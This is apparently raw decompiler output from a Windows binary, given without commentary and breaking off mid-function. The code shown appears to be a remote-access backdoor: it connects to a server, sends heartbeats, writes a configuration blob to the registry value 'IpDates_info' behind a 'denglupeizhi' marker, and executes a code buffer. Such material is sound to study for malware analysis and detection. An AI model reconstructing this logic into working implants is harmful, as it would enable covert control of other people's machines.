/* Function: FUN_004019d0 */

int __cdecl FUN_004019d0(void *param_1,int param_2)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 *puVar3;
  uint uVar4;
  code *pcVar5;
  int in_EAX;
  int *piVar6;
  int iVar7;
  uint extraout_ECX;
  int iVar8;
  int *piVar9;
  bool bVar10;
  
  piVar9 = *(int **)(in_EAX + 0x8c);
  iVar8 = 0;
  bVar10 = -1 < param_2;
  if ((int *)(in_EAX + 0x8c) == piVar9) {
    return -1;
  }
  if (param_2 < 0) {
    param_2 = -param_2;
  }
  if (piVar9[4] == 0) {
    iVar8 = piVar9[9];
  }
  else {
    piVar6 = piVar9;
    if (*(uint *)(in_EAX + 100) < piVar9[4] + 1U) {
      return -2;
    }
    do {
      iVar8 = iVar8 + piVar6[9];
      if (piVar6[4] == 0) break;
      piVar6 = (int *)*piVar6;
    } while (piVar6 != (int *)(in_EAX + 0x8c));
  }
  if (iVar8 < 0) {
    return -2;
  }
  if (param_2 < iVar8) {
    return -3;
  }
  uVar4 = *(uint *)(in_EAX + 100);
  uVar2 = *(uint *)(in_EAX + 0x3c);
  param_2 = 0;
  do {
    piVar6 = (int *)*piVar9;
    if (param_1 != (void *)0x0) {
      FID_conflict__memcpy(param_1,piVar9 + 0xe,piVar9[9]);
      param_1 = (void *)((int)param_1 + piVar9[9]);
    }
    param_2 = param_2 + piVar9[9];
    iVar8 = piVar9[4];
    iVar7 = FUN_00401680(8);
    if (iVar7 != 0) {
      FUN_00401610(extraout_ECX,"recv sn=%lu");
    }
    if (bVar10) {
      *(int *)(*piVar9 + 4) = piVar9[1];
      *(int *)piVar9[1] = *piVar9;
      pcVar5 = DAT_0041bd8c;
      *piVar9 = 0;
      piVar9[1] = 0;
      if (pcVar5 == (code *)0x0) {
        _free(piVar9);
      }
      else {
        (*pcVar5)();
      }
      *(int *)(in_EAX + 100) = *(int *)(in_EAX + 100) + -1;
    }
  } while ((iVar8 != 0) && (piVar9 = piVar6, piVar6 != (int *)(in_EAX + 0x8c)));
  puVar1 = (undefined4 *)(in_EAX + 0x9c);
  puVar3 = (undefined4 *)*puVar1;
  while (((puVar1 != puVar3 && (piVar9 = (int *)*puVar1, piVar9[7] == *(int *)(in_EAX + 0x18))) &&
         (*(uint *)(in_EAX + 100) < *(uint *)(in_EAX + 0x3c)))) {
    *(int *)(*piVar9 + 4) = piVar9[1];
    *(int *)piVar9[1] = *piVar9;
    *piVar9 = 0;
    piVar9[1] = 0;
    *(int *)(in_EAX + 0x5c) = *(int *)(in_EAX + 0x5c) + -1;
    piVar9[1] = *(int *)(in_EAX + 0x90);
    *piVar9 = in_EAX + 0x8c;
    **(undefined4 **)(in_EAX + 0x90) = piVar9;
    *(int **)(in_EAX + 0x90) = piVar9;
    *(int *)(in_EAX + 100) = *(int *)(in_EAX + 100) + 1;
    *(int *)(in_EAX + 0x18) = *(int *)(in_EAX + 0x18) + 1;
    puVar3 = (undefined4 *)*puVar1;
  }
  if ((*(uint *)(in_EAX + 100) < *(uint *)(in_EAX + 0x3c)) && (uVar2 <= uVar4)) {
    *(uint *)(in_EAX + 0x48) = *(uint *)(in_EAX + 0x48) | 2;
  }
  return param_2;
}





/* Function: FUN_00402d80 */

/* WARNING: Type propagation algorithm not settling */

void __thiscall FUN_00402d80(void *this,LPCWSTR param_1,undefined4 param_2)

{
  DWORD DVar1;
  int iVar2;
  LPSTR pCVar3;
  uintptr_t uVar4;
  LPSTR pCVar5;
  int cbMultiByte;
  LPCSTR pCVar6;
  uint cbMultiByte_00;
  LPBOOL pBVar7;
  undefined1 local_40 [4];
  uint local_3c [5];
  undefined4 local_28;
  undefined2 local_24;
  undefined2 local_22;
  undefined4 local_20;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  ResetEvent(*(HANDLE *)((int)this + 4));
  InterlockedExchange((LONG *)((int)this + 0x18),0);
  DVar1 = timeGetTime();
  *(DWORD *)((int)this + 0x14) = DVar1;
  *(undefined4 *)((int)this + 0x20) = 0;
  *(undefined4 *)((int)this + 0x24) = 0;
  *(undefined2 *)((int)this + 0x28) = 0;
  *(undefined4 *)((int)this + 0x20) = *(undefined4 *)((int)this + 0x14);
  *(undefined4 *)((int)this + 0x24) = *(undefined4 *)((int)this + 0x18);
  *(undefined2 *)((int)this + 0x28) = 0xca;
  iVar2 = Ordinal_23(2,1,6);
  *(int *)((int)this + 100) = iVar2;
  if (iVar2 == -1) {
    __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  pBVar7 = (LPBOOL)0x0;
  pCVar6 = (LPCSTR)0x0;
  cbMultiByte = 0;
  pCVar5 = (LPSTR)0x0;
  iVar2 = lstrlenW(param_1);
  local_3c[4] = WideCharToMultiByte(0,0,param_1,iVar2,pCVar5,cbMultiByte,pCVar6,pBVar7);
  pCVar3 = (LPSTR)FUN_004069bf(local_3c[4] + 1);
  pBVar7 = (LPBOOL)0x0;
  pCVar6 = (LPCSTR)0x0;
  pCVar5 = pCVar3;
  cbMultiByte_00 = local_3c[4];
  iVar2 = lstrlenW(param_1);
  WideCharToMultiByte(0,0,param_1,iVar2,pCVar5,cbMultiByte_00,pCVar6,pBVar7);
  pCVar3[local_3c[4]] = '\0';
  iVar2 = Ordinal_52(pCVar3);
  FUN_004069ca(pCVar3);
  if (iVar2 != 0) {
    local_24 = 2;
    local_22 = Ordinal_9(param_2);
    local_20 = *(undefined4 *)**(undefined4 **)(iVar2 + 0xc);
    iVar2 = Ordinal_4(*(undefined4 *)((int)this + 100),&local_24,0x10);
    if (iVar2 != -1) {
      local_28 = 0x40000;
      Ordinal_21(*(undefined4 *)((int)this + 100),0xffff,0x1001,&local_28,4);
      local_28 = 0x40000;
      Ordinal_21(*(undefined4 *)((int)this + 100),0xffff,0x1002,&local_28,4);
      local_3c[2] = 30000;
      Ordinal_21(*(undefined4 *)((int)this + 100),0xffff,0x1006,local_3c + 2,4);
      local_3c[1] = 1;
      iVar2 = Ordinal_21(*(undefined4 *)((int)this + 100),0xffff,8,local_3c + 1,4);
      if (iVar2 == 0) {
        local_14 = 1;
        local_10 = 180000;
        local_c = 5000;
        WSAIoctl(*(undefined4 *)((int)this + 100),0x98000004,&local_14,0xc,0,0,local_40,0,0);
      }
      InterlockedExchange((LONG *)((int)this + 0x18),1);
      local_3c[3] = 0;
      uVar4 = __beginthreadex((void *)0x0,0,FUN_00402fb0,this,0,local_3c + 3);
      *(uintptr_t *)((int)this + 0x5c) = uVar4;
      uVar4 = __beginthreadex((void *)0x0,0,FUN_004030c0,this,0,local_3c);
      *(uintptr_t *)((int)this + 0x60) = uVar4;
      __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
  }
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}





/* Function: FUN_004030c0 */

undefined4 FUN_004030c0(int *param_1)

{
  DWORD DVar1;
  int iVar2;
  undefined1 local_5;
  
  iVar2 = param_1[6];
  do {
    if (iVar2 == 0) {
      return 0;
    }
    iVar2 = 0;
    do {
      if (param_1[6] == 0) {
        return 0;
      }
      Sleep(10);
      iVar2 = iVar2 + 1;
    } while (iVar2 < 1000);
    (**(code **)(*param_1 + 8))(&local_5,1);
    DVar1 = timeGetTime();
    if (60000 < DVar1 - param_1[5]) {
      if (param_1[6] == 0) {
        return 0;
      }
      (**(code **)*param_1)();
    }
    iVar2 = param_1[6];
  } while( true );
}





/* Function: FUN_00403340 */

uint FUN_00403340(int param_1,void *param_2,size_t param_3)

{
  void *_Dst;
  uint *puVar1;
  uint *puVar2;
  DWORD DVar3;
  int iVar4;
  uint *puVar5;
  uint extraout_ECX;
  uint uVar6;
  uint *puVar7;
  uint uVar8;
  uint uVar9;
  int iVar10;
  
  FUN_00401100();
  FID_conflict__memcpy(*(void **)(param_1 + 0x34),param_2,param_3);
  *(int *)(param_1 + 0x34) = *(int *)(param_1 + 0x34) + param_3;
LAB_00403380:
  do {
    iVar10 = *(int *)(param_1 + 0x30);
    if ((iVar10 == 0) || (iVar4 = *(int *)(param_1 + 0x34) - iVar10, iVar4 < 0xf)) {
LAB_004034d1:
      return CONCAT31((int3)((uint)iVar10 >> 8),1);
    }
    uVar8 = 10;
    puVar2 = *(uint **)(param_1 + 0x30) + 1;
    puVar7 = (uint *)(param_1 + 0x20);
    do {
      puVar5 = puVar7;
      puVar1 = puVar2;
      puVar7 = puVar5;
      if (*puVar5 != *puVar1) goto LAB_004034b6;
      uVar8 = uVar8 - 4;
      puVar2 = puVar1 + 1;
      puVar7 = puVar5 + 1;
    } while (3 < uVar8);
    if (((char)*puVar2 != (char)*puVar7) ||
       (*(char *)((int)puVar1 + 5) != *(char *)((int)puVar5 + 5))) {
LAB_004034b6:
      *(undefined4 *)(param_1 + 0x34) = *(undefined4 *)(param_1 + 0x30);
      uVar8 = FUN_004011b0(puVar7,0x400);
      return uVar8 & 0xffffff00;
    }
    uVar8 = **(uint **)(param_1 + 0x30);
    iVar10 = CONCAT31((int3)((uint)puVar2 >> 8),*(char *)((int)puVar1 + 5));
    if ((uVar8 == 0) || (iVar10 = iVar4, iVar4 < (int)uVar8)) goto LAB_004034d1;
    DVar3 = timeGetTime();
    *(DWORD *)(param_1 + 0x14) = DVar3;
    *(undefined4 *)(param_1 + 0x44) = *(undefined4 *)(param_1 + 0x40);
    FUN_004011b0(*(undefined4 *)(param_1 + 0x40),0x400);
    FUN_00401060((void *)(*(int *)(param_1 + 0x30) + 0xe),uVar8 - 0xe,1,param_1 + 0x20);
    if (*(int *)(param_1 + 0x40) == 0) {
      iVar10 = 0;
    }
    else {
      iVar10 = *(int *)(param_1 + 0x44) - *(int *)(param_1 + 0x40);
    }
    (**(code **)**(undefined4 **)(param_1 + 0x1c))(*(undefined4 *)(param_1 + 0x40),iVar10);
    uVar6 = *(uint *)(param_1 + 0x38);
  } while (uVar6 < uVar8);
  _Dst = *(void **)(param_1 + 0x30);
  if (_Dst == (void *)0x0) {
    uVar9 = 0;
  }
  else {
    uVar9 = *(int *)(param_1 + 0x34) - (int)_Dst;
  }
  if (uVar9 < uVar8) {
    if (_Dst != (void *)0x0) {
      uVar8 = *(int *)(param_1 + 0x34) - (int)_Dst;
      goto LAB_00403479;
    }
  }
  else {
LAB_00403479:
    if (uVar8 != 0) {
      FID_conflict__memcpy(_Dst,(void *)((int)_Dst + uVar8),uVar6 - uVar8);
      *(int *)(param_1 + 0x34) = *(int *)(param_1 + 0x34) - uVar8;
      uVar6 = extraout_ECX;
    }
    if (*(int *)(param_1 + 0x30) != 0) {
      FUN_004011b0(uVar6,*(int *)(param_1 + 0x34) - *(int *)(param_1 + 0x30));
      goto LAB_00403380;
    }
  }
  FUN_004011b0(uVar6,0);
  goto LAB_00403380;
}





/* Function: FUN_00404420 */

uint __thiscall FUN_00404420(void *this,LPCWSTR param_1,undefined4 param_2)

{
  DWORD DVar1;
  uint uVar2;
  uintptr_t uVar3;
  void *local_8;
  
  local_8 = this;
  ResetEvent(*(HANDLE *)((int)this + 4));
  ResetEvent(*(HANDLE *)((int)this + 0x264));
  DVar1 = timeGetTime();
  *(DWORD *)((int)this + 0x14) = DVar1;
  InterlockedExchange((LONG *)((int)this + 0x18),0);
  *(undefined4 *)((int)this + 0x20) = 0;
  *(undefined4 *)((int)this + 0x24) = 0;
  *(undefined2 *)((int)this + 0x28) = 0;
  *(undefined4 *)((int)this + 0x20) = *(undefined4 *)((int)this + 0x14);
  *(undefined4 *)((int)this + 0x24) = *(undefined4 *)((int)this + 0x18);
  *(undefined2 *)((int)this + 0x28) = 0xca;
  if (*(int *)((int)this + 100) != 3) {
    FUN_00403f50();
  }
  FUN_004034e0(param_1,param_2);
  uVar2 = WaitForSingleObject(*(HANDLE *)((int)this + 0x264),6000);
  if (uVar2 != 0) {
    if (uVar2 == 0x102) {
      uVar2 = ResetEvent(*(HANDLE *)((int)this + 0x264));
    }
    else if (uVar2 == 0xffffffff) {
      uVar2 = ResetEvent(*(HANDLE *)((int)this + 0x264));
      return uVar2 & 0xffffff00;
    }
    return uVar2 & 0xffffff00;
  }
  InterlockedExchange((LONG *)((int)this + 0x18),1);
  ResetEvent(*(HANDLE *)((int)this + 0x264));
  uVar3 = __beginthreadex((void *)0x0,0,FUN_00404520,this,0,(uint *)&local_8);
  *(uintptr_t *)((int)this + 0x268) = uVar3;
  return CONCAT31((int3)(uVar3 >> 8),1);
}





/* Function: FUN_00404520 */

undefined4 FUN_00404520(int *param_1)

{
  LONG *Destination;
  code *pcVar1;
  DWORD DVar2;
  LONG LVar3;
  undefined4 uVar4;
  int iVar5;
  uint uVar6;
  HANDLE local_c;
  undefined1 local_5;
  
  iVar5 = param_1[6];
  local_5 = 0xc9;
  do {
    if (iVar5 == 0) {
      return 0;
    }
    iVar5 = 0;
    do {
      if (param_1[6] == 0) goto LAB_0040456b;
      Sleep(100);
      iVar5 = iVar5 + 1;
    } while (iVar5 < 100);
    if (param_1[6] != 0) {
      (**(code **)(*param_1 + 8))(&local_5,1);
    }
LAB_0040456b:
    DVar2 = timeGetTime();
    if ((30000 < DVar2 - param_1[5]) && (param_1[0x19] != 3)) {
      DVar2 = GetCurrentThreadId();
      if (param_1[0x19] != 3) {
        Destination = param_1 + 0x57;
        uVar6 = 0;
        while (LVar3 = InterlockedCompareExchange(Destination,1,0), LVar3 != 0) {
          if ((uVar6 & 0xfff) == 0xfff) {
            SwitchToThread();
            uVar6 = uVar6 + 1;
          }
          else {
            uVar6 = uVar6 + 1;
          }
        }
        if ((param_1[0x19] == 1) || (param_1[0x19] == 0)) {
          param_1[0x19] = 2;
          *Destination = 0;
          if (param_1[0x15] != 0) {
            if (DVar2 != param_1[0x16]) {
              SetEvent((HANDLE)param_1[99]);
              local_c = (HANDLE)param_1[0x15];
              iVar5 = FUN_00402bd0(&local_c);
              if (iVar5 != 0) {
                if (iVar5 == 0x102) {
                  SetLastError(0x5b4);
                }
                FUN_00401280();
                pcVar1 = (code *)swi(3);
                uVar4 = (*pcVar1)();
                return uVar4;
              }
            }
            CloseHandle((HANDLE)param_1[0x15]);
            param_1[0x15] = 0;
            param_1[0x16] = 0;
          }
          if (param_1[0x18] != 0) {
            if (param_1[0xf] != 0) {
              Ordinal_19(param_1[0x10],&DAT_00417440,0x10,0);
            }
            param_1[0x18] = 0;
          }
          if (param_1[0xc] != 0) {
            FUN_00402c50();
            SetEvent((HANDLE)param_1[1]);
            InterlockedExchange(param_1 + 6,0);
          }
          if (param_1[0x11] != 0) {
            WSACloseEvent(param_1[0x11]);
            param_1[0x11] = 0;
          }
          if (param_1[0x10] != -1) {
            Ordinal_22(param_1[0x10],1);
            Ordinal_3(param_1[0x10]);
            param_1[0x10] = -1;
          }
          FUN_00404050();
          goto LAB_004046bf;
        }
        *Destination = 0;
      }
      param_1[0x17] = 1;
      SetLastError(0x139f);
    }
LAB_004046bf:
    iVar5 = param_1[6];
  } while( true );
}





/* Function: FUN_00404940 */

undefined4 FUN_00404940(int param_1,void *param_2,size_t param_3)

{
  void *_Dst;
  uint *puVar1;
  uint *puVar2;
  DWORD DVar3;
  int iVar4;
  uint *puVar5;
  uint extraout_ECX;
  uint uVar6;
  uint *puVar7;
  uint uVar8;
  uint uVar9;
  
  FUN_00401100();
  FID_conflict__memcpy(*(void **)(param_1 + 0x23c),param_2,param_3);
  *(int *)(param_1 + 0x23c) = *(int *)(param_1 + 0x23c) + param_3;
LAB_00404982:
  do {
    do {
      if (*(int *)(param_1 + 0x238) == 0) {
        return 0;
      }
      iVar4 = *(int *)(param_1 + 0x23c) - *(int *)(param_1 + 0x238);
      if (iVar4 < 0xf) {
        return 0;
      }
      uVar8 = 10;
      puVar1 = *(uint **)(param_1 + 0x238) + 1;
      puVar7 = (uint *)(param_1 + 0x20);
      do {
        puVar5 = puVar7;
        puVar2 = puVar1;
        puVar7 = puVar5;
        if (*puVar5 != *puVar2) goto LAB_00404ac4;
        uVar8 = uVar8 - 4;
        puVar7 = puVar5 + 1;
        puVar1 = puVar2 + 1;
      } while (3 < uVar8);
      if (((char)puVar2[1] != (char)*puVar7) ||
         (*(char *)((int)puVar2 + 5) != *(char *)((int)puVar5 + 5))) {
LAB_00404ac4:
        *(undefined4 *)(param_1 + 0x23c) = *(undefined4 *)(param_1 + 0x238);
        FUN_004011b0(puVar7,0x400);
        return 0;
      }
      uVar8 = **(uint **)(param_1 + 0x238);
      if (uVar8 == 0) {
        return 0;
      }
      if (iVar4 < (int)uVar8) {
        return 0;
      }
      DVar3 = timeGetTime();
      *(DWORD *)(param_1 + 0x14) = DVar3;
      *(undefined4 *)(param_1 + 0x24c) = *(undefined4 *)(param_1 + 0x248);
      FUN_004011b0(*(undefined4 *)(param_1 + 0x248),0x400);
      FUN_00401060((void *)(*(int *)(param_1 + 0x238) + 0xe),uVar8 - 0xe,1,param_1 + 0x20);
      if (*(int *)(param_1 + 0x248) == 0) {
        iVar4 = 0;
      }
      else {
        iVar4 = *(int *)(param_1 + 0x24c) - *(int *)(param_1 + 0x248);
      }
      (**(code **)**(undefined4 **)(param_1 + 0x1c))(*(undefined4 *)(param_1 + 0x248),iVar4);
      uVar6 = *(uint *)(param_1 + 0x240);
    } while (uVar6 < uVar8);
    _Dst = *(void **)(param_1 + 0x238);
    if (_Dst == (void *)0x0) {
      uVar9 = 0;
    }
    else {
      uVar9 = *(int *)(param_1 + 0x23c) - (int)_Dst;
    }
    if (uVar9 < uVar8) {
      if (_Dst != (void *)0x0) {
        uVar8 = *(int *)(param_1 + 0x23c) - (int)_Dst;
        goto LAB_00404a87;
      }
LAB_00404aa5:
      FUN_004011b0(uVar6,0);
      goto LAB_00404982;
    }
LAB_00404a87:
    if (uVar8 != 0) {
      FID_conflict__memcpy(_Dst,(void *)((int)_Dst + uVar8),uVar6 - uVar8);
      *(int *)(param_1 + 0x23c) = *(int *)(param_1 + 0x23c) - uVar8;
      uVar6 = extraout_ECX;
    }
    if (*(int *)(param_1 + 0x238) == 0) goto LAB_00404aa5;
    FUN_004011b0(uVar6,*(int *)(param_1 + 0x23c) - *(int *)(param_1 + 0x238));
  } while( true );
}





/* Function: FUN_00404af0 */

undefined4 * __thiscall FUN_00404af0(void *this,undefined4 *param_1,int *param_2)

{
  undefined4 *puVar1;
  int *piVar2;
  undefined4 in_EAX;
  LONG LVar3;
  DWORD DVar4;
  
  puVar1 = param_1;
  param_1[1] = in_EAX;
  param_1[2] = this;
  param_1 = (undefined4 *)timeGetTime();
  LVar3 = InterlockedIncrement((LONG *)&param_1);
  puVar1[7] = LVar3;
  if (LVar3 == 0) {
    LVar3 = InterlockedIncrement((LONG *)&param_1);
    puVar1[7] = LVar3;
  }
  piVar2 = param_2;
  FUN_004051b0(param_2);
  (**(code **)*puVar1)(piVar2);
  DVar4 = timeGetTime();
  puVar1[6] = DVar4;
  puVar1[4] = DVar4;
  puVar1[5] = 0;
  puVar1[3] = 0;
  puVar1[9] = 1;
  FUN_00404ca0((int)puVar1);
  return puVar1;
}





/* Function: FUN_00404ca0 */

bool __fastcall FUN_00404ca0(int param_1)

{
  LPCRITICAL_SECTION lpCriticalSection;
  undefined4 uVar1;
  int iVar2;
  undefined4 uVar3;
  bool bVar4;
  DWORD DVar5;
  DWORD DVar6;
  int iVar7;
  undefined2 *puVar8;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00414230;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if (*(int *)(param_1 + 0x24) == 0) {
    SetLastError(0x139f);
    ExceptionList = local_10;
    return false;
  }
  lpCriticalSection = (LPCRITICAL_SECTION)(param_1 + 0x28);
  local_8 = 0;
  EnterCriticalSection(lpCriticalSection);
  local_8 = CONCAT31(local_8._1_3_,1);
  if (*(int *)(param_1 + 0x24) == 0) {
    SetLastError(0x139f);
    LeaveCriticalSection(lpCriticalSection);
    FUN_0040747b((void *)0x0);
    ExceptionList = local_10;
    return false;
  }
  DVar5 = timeGetTime();
  iVar7 = *(int *)(param_1 + 0x18);
  DVar6 = DVar5;
  if (DVar5 == 0) {
    DVar6 = timeGetTime();
  }
  if (*(uint *)(*(int *)(param_1 + 4) + 0x1c4) < DVar6 - iVar7) {
    SetLastError(0x5b4);
    LeaveCriticalSection(lpCriticalSection);
    FUN_0040747b((void *)0x0);
    ExceptionList = local_10;
    return false;
  }
  iVar7 = *(int *)(param_1 + 0x10);
  DVar6 = DVar5;
  if (DVar5 == 0) {
    DVar6 = timeGetTime();
  }
  if ((int)(DVar6 - iVar7) < 0) {
    LeaveCriticalSection(lpCriticalSection);
    FUN_0040747b((void *)0x0);
    bVar4 = true;
  }
  else {
    *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + 1;
    if ((uint)(*(int *)(*(int *)(param_1 + 0x58) + 0x50) * *(int *)(param_1 + 0x14)) < 2000) {
      iVar7 = *(int *)(param_1 + 0x14) + 1;
      *(int *)(param_1 + 0x14) = iVar7;
      iVar7 = *(int *)(*(int *)(param_1 + 0x58) + 0x50) * iVar7;
    }
    else {
      iVar7 = 2000;
    }
    uVar1 = *(undefined4 *)(param_1 + 0x20);
    iVar2 = *(int *)(param_1 + 0x24);
    *(DWORD *)(param_1 + 0x10) = iVar7 + DVar5;
    uVar3 = *(undefined4 *)(param_1 + 0x1c);
    puVar8 = (undefined2 *)FUN_004069bf(0xc);
    *puVar8 = 0xbb4f;
    *(undefined1 *)(puVar8 + 1) = 1;
    *(bool *)((int)puVar8 + 3) = iVar2 == 2;
    *(undefined4 *)(puVar8 + 2) = uVar3;
    *(undefined4 *)(puVar8 + 4) = uVar1;
    FUN_0040747b((void *)0x0);
    LeaveCriticalSection(lpCriticalSection);
    bVar4 = FUN_00404270(*(int *)(param_1 + 4));
    FUN_0040747b(puVar8);
  }
  ExceptionList = local_10;
  return bVar4;
}





/* Function: FUN_00404e70 */

undefined4 FUN_00404e70(int param_1)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION lpCriticalSection_00;
  int in_EAX;
  BOOL BVar1;
  DWORD DVar2;
  
  if (*(int *)(in_EAX + 0x24) != 2) {
    SetLastError(0x139f);
    return 0;
  }
  lpCriticalSection = (LPCRITICAL_SECTION)(in_EAX + 0x28);
  BVar1 = TryEnterCriticalSection(lpCriticalSection);
  if (BVar1 != 0) {
    lpCriticalSection_00 = (LPCRITICAL_SECTION)(in_EAX + 0x40);
    BVar1 = TryEnterCriticalSection(lpCriticalSection_00);
    if (BVar1 != 0) {
      if (*(int *)(in_EAX + 0x24) != 2) {
        SetLastError(0x139f);
        LeaveCriticalSection(lpCriticalSection_00);
        LeaveCriticalSection(lpCriticalSection);
        return 0;
      }
      if (param_1 == 0) {
        DVar2 = timeGetTime();
        FUN_00402aa0(DVar2);
      }
      else {
        FUN_004024b0();
      }
      LeaveCriticalSection(lpCriticalSection_00);
    }
    LeaveCriticalSection(lpCriticalSection);
  }
  return 1;
}





/* Function: FUN_00404f20 */

undefined4 FUN_00404f20(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  byte bVar1;
  int iVar2;
  int iVar3;
  short *in_EAX;
  DWORD DVar4;
  int unaff_ESI;
  undefined4 uVar5;
  
  bVar1 = *(byte *)((int)in_EAX + 3);
  iVar2 = *(int *)(in_EAX + 2);
  iVar3 = *(int *)(in_EAX + 4);
  if (((*in_EAX != -0x44b1) || ((char)in_EAX[1] != '\x01')) || ((bVar1 & 0xfe) != 0)) {
    Ordinal_112(0xd);
    return 2;
  }
  lpCriticalSection = (LPCRITICAL_SECTION)(unaff_ESI + 0x28);
  EnterCriticalSection(lpCriticalSection);
  if (*(int *)(unaff_ESI + 0x24) == 0) {
    uVar5 = 0x139f;
    goto LAB_00404f7a;
  }
  if (*(int *)(unaff_ESI + 0x24) == 2) {
    if (iVar2 == *(int *)(unaff_ESI + 0x20)) {
      if (iVar3 == *(int *)(unaff_ESI + 0x1c)) goto LAB_0040503a;
      if (iVar3 == 0) {
        iVar2 = *(int *)(unaff_ESI + 0x18);
        DVar4 = timeGetTime();
        if (DVar4 - iVar2 <= (uint)(*(int *)(*(int *)(unaff_ESI + 4) + 0x1c4) * 2))
        goto LAB_0040503a;
      }
    }
  }
  else {
    if (*(int *)(unaff_ESI + 0x20) == 0) {
      *(int *)(unaff_ESI + 0x20) = iVar2;
      DVar4 = timeGetTime();
      *(DWORD *)(unaff_ESI + 0x10) = DVar4;
      *(undefined4 *)(unaff_ESI + 0x14) = 0;
    }
    else if (iVar2 != *(int *)(unaff_ESI + 0x20)) goto LAB_00404fc6;
    if (iVar3 == *(int *)(unaff_ESI + 0x1c)) {
      iVar2 = *(int *)(unaff_ESI + 4);
      *(undefined4 *)(unaff_ESI + 0x24) = 2;
      FUN_00402c50();
      SetEvent(*(HANDLE *)(iVar2 + 0x264));
      InterlockedExchange((LONG *)(iVar2 + 0x18),1);
      LeaveCriticalSection(lpCriticalSection);
      return 0;
    }
    if (iVar3 == 0) {
LAB_0040503a:
      LeaveCriticalSection(lpCriticalSection);
      if ((*(int *)(unaff_ESI + 0xc) == 0) && (bVar1 == 1)) {
        *(undefined4 *)(unaff_ESI + 0xc) = 1;
      }
      FUN_00404ca0(unaff_ESI);
      return 0;
    }
  }
LAB_00404fc6:
  uVar5 = 0x2746;
LAB_00404f7a:
  Ordinal_112(uVar5);
  LeaveCriticalSection(lpCriticalSection);
  return 2;
}





/* Function: FUN_004052c0 */

undefined4 FUN_004052c0(int param_1)

{
  int iVar1;
  HANDLE hProcess;
  BOOL BVar2;
  int iVar3;
  HKEY local_20;
  DWORD aDStack_1c [6];
  
  iVar3 = 0;
  if (0 < DAT_0041bf98) {
    do {
      iVar1 = 0;
      do {
        if (DAT_0041c7d4[iVar1 + iVar3] != (code)"denglupeizhi"[iVar1]) break;
        if (DAT_0041c7d4[iVar1 + iVar3 + 1] != (code)"denglupeizhi"[iVar1 + 1]) {
          iVar1 = iVar1 + 1;
          break;
        }
        if (DAT_0041c7d4[iVar1 + iVar3 + 2] != (code)"denglupeizhi"[iVar1 + 2]) {
          iVar1 = iVar1 + 2;
          break;
        }
        if (DAT_0041c7d4[iVar1 + iVar3 + 3] != (code)"denglupeizhi"[iVar1 + 3]) {
          iVar1 = iVar1 + 3;
          break;
        }
        if (DAT_0041c7d4[iVar1 + iVar3 + 4] != (code)"denglupeizhi"[iVar1 + 4]) {
          iVar1 = iVar1 + 4;
          break;
        }
        if (DAT_0041c7d4[iVar1 + iVar3 + 5] != (code)"denglupeizhi"[iVar1 + 5]) {
          iVar1 = iVar1 + 5;
          break;
        }
        iVar1 = iVar1 + 6;
      } while (iVar1 < 0xc);
      if (iVar1 == 0xc) {
        if (iVar3 != -1) {
          FID_conflict__memcpy(DAT_0041c7d4 + iVar3,&DAT_0041c7d8,0x12a0);
        }
        break;
      }
      iVar3 = iVar3 + 1;
    } while (iVar3 < DAT_0041bf98);
  }
  RegOpenKeyExW((HKEY)0x80000002,L"SOFTWARE",0,0x102,&local_20);
  RegDeleteValueW(local_20,L"IpDates_info");
  RegSetValueExW(local_20,L"IpDates_info",0,3,&DAT_0041c7d8,0x12a0);
  RegCloseKey(local_20);
  if (*(int *)(param_1 + 0x14) != 0) {
    aDStack_1c[1] = 0;
    aDStack_1c[2] = 0;
    aDStack_1c[3] = 0;
    aDStack_1c[4] = 0;
    do {
      do {
        iVar3 = FUN_00405830();
      } while (iVar3 == 0);
      while (((hProcess = OpenProcess(0x400,0,aDStack_1c[3]), hProcess != (HANDLE)0x0 &&
              (BVar2 = GetExitCodeProcess(hProcess,aDStack_1c), BVar2 != 0)) &&
             (aDStack_1c[0] == 0x103))) {
        Sleep(3000);
      }
    } while( true );
  }
  (*DAT_0041c7d4)();
  return 0;
}





/* Function: FUN_004054d0 */

void __thiscall FUN_004054d0(void *this,HKEY param_1,uint param_2)

{
  ushort uVar1;
  LSTATUS LVar2;
  LPDWORD lpcbData;
  ushort *puVar3;
  undefined1 *puVar4;
  BYTE *lpData;
  uintptr_t uVar5;
  int iVar6;
  ushort *puVar7;
  HKEY pHVar8;
  LPDWORD pDVar9;
  undefined4 *puVar10;
  DWORD *pDVar11;
  undefined4 *puVar12;
  BYTE *pBVar13;
  bool bVar14;
  HKEY hKey;
  undefined4 local_a54;
  undefined4 local_a50;
  undefined4 local_a4c;
  undefined4 local_a48;
  undefined4 local_a44;
  undefined4 local_a40;
  undefined4 local_a3c;
  undefined2 local_a38;
  undefined1 local_a36 [484];
  undefined2 local_852;
  undefined4 local_850;
  undefined4 local_84c;
  undefined1 local_848 [100];
  undefined1 local_7e4 [2000];
  undefined4 local_14;
  DWORD local_10;
  HKEY local_c;
  void *local_8;
  
  pHVar8 = param_1;
  if ((char)param_1->unused != -0x37) {
    local_8 = this;
    if (param_2 == 0x65) {
      local_10 = 3;
      param_2 = 0;
      LVar2 = RegOpenKeyExW((HKEY)0x80000001,L"Console\\0",0,0x20019,&local_c);
      if (LVar2 == 0) {
        hKey = local_c;
        RegQueryValueExW(local_c,L"d33f351a4aeea5e608853d1a56661059",(LPDWORD)0x0,&local_10,
                         (LPBYTE)0x0,&param_2);
        if (0xa44 < param_2) {
          lpcbData = (LPDWORD)FUN_004069bf(param_2);
          _memset(lpcbData,0,param_2);
          LVar2 = RegQueryValueExW(hKey,(LPCWSTR)local_c,
                                   (LPDWORD)L"d33f351a4aeea5e608853d1a56661059",(LPDWORD)0x0,
                                   (LPBYTE)&local_10,lpcbData);
          pHVar8 = param_1;
          if (LVar2 == 0) {
            pDVar9 = lpcbData;
            pDVar11 = &DAT_0041bd90;
